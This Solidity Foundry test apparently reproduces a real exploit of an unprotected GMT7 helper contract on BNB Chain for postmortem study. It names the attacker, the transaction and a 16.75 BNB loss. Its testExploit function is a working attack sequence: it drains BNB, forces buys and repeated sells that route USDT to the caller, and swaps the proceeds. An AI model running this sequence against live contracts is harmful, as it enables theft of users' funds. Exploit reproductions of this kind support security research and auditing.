// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 16.75 BNB
// Attacker : 0x0A4125690753b6Cc82cAdbCa0f0899eb2025acB0
// Attack Contract : 0x8EA93821691BB9Ec2cE0b4EDaCd920e9025779E4
// Vulnerable Contract : 0x9AD90eeaB3CAff64A762Cb40387Ee1BB18bd31E3
// Attack Tx : https://bscscan.com/tx/0x5eb225ce9fb2c7a169e1736eb3b2bf2b6a5843839dd84cdcf6fe2ab0577ae21f
//
// @Info
// Vulnerable Contract Code : unverified
// GMT7 Token Code : https://bscscan.com/address/0xf1a895976d7916f4c38ce0bb1ea2945448888888#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/443
//
// The unverified GMT7 helper held token balances and router approvals. Its public trading
// functions let the attacker force the helper to buy GMT7, then repeatedly sell the helper's
// GMT7 to the GMT7/USDT pair while routing USDT output to the attack contract.

address constant ATTACKER = 0x0a4125690753b6cc82CADbCa0f0899eB2025ACB0;
address constant ATTACK_CONTRACT = 0x8Ea93821691bB9eC2cE0b4eDACD920e9025779E4;
address constant VULNERABLE_HELPER = 0x9AD90EEAb3CAFF64A762CB40387eE1Bb18BD31E3;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

interface IGMT7Helper {
    function transferBnb(
        address[] calldata receivers
    ) external;
    function buyTokenAmount(
        uint256 amount
    ) external;
    function robotSell2me(
        uint256 amount
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    IGMT7Helper private constant helper = IGMT7Helper(VULNERABLE_HELPER);
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));
    IERC20 private constant usdt = IERC20(USDT_TOKEN);

    function setUp() public {
        uint256 forkBlock = 46_497_384;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = address(0);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VULNERABLE_HELPER, "GMT7 Helper");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(WBNB_TOKEN, "WBNB");
    }

    function testExploit() public balanceLog {
        uint256 balanceBefore = address(this).balance;

        address[] memory receivers = new address[](1);
        receivers[0] = address(this);
        helper.transferBnb(receivers);

        helper.buyTokenAmount(3023);
        for (uint256 i = 0; i < 44; i++) {
            helper.robotSell2me(100);
        }
        helper.robotSell2me(58);

        uint256 usdtBalance = usdt.balanceOf(address(this));
        usdt.approve(PANCAKE_ROUTER, usdtBalance);

        address[] memory path = new address[](2);
        path[0] = USDT_TOKEN;
        path[1] = WBNB_TOKEN;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(usdtBalance, 0, path, address(this), block.timestamp);

        assertGt(address(this).balance - balanceBefore, 16 ether);
    }

    receive() external payable {}
}
